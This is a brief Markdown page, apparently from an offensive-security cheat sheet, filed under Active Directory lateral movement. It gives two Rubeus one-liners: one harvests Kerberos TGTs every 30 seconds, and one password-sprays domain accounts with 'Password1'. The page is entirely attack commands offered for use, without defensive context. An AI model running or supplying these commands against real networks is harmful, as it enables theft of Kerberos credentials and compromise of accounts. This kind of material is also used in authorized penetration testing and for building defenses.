---
title: "Ticket Harvesting"
description: "Ticket harvesting using Rubeus."
lead: "How to perform ticket harvesting using Rubeus."
date: 2021-11-06T11:53:35+01:00
lastmod: 2021-11-06T11:53:35+01:00
draft: false
images: []
menu: 
  active_directory:
    parent: "lateral_movement"
weight: 50
toc: true
---

## Harvesting Tickets

```powershell
# Harvest for TGTs every 30 seconds
Rubeus.exe harvest /interval:30
```

## Brute-forcing / Password-spraying

```powershell
Rubeus.exe brute /password:Password1 /noticket
```
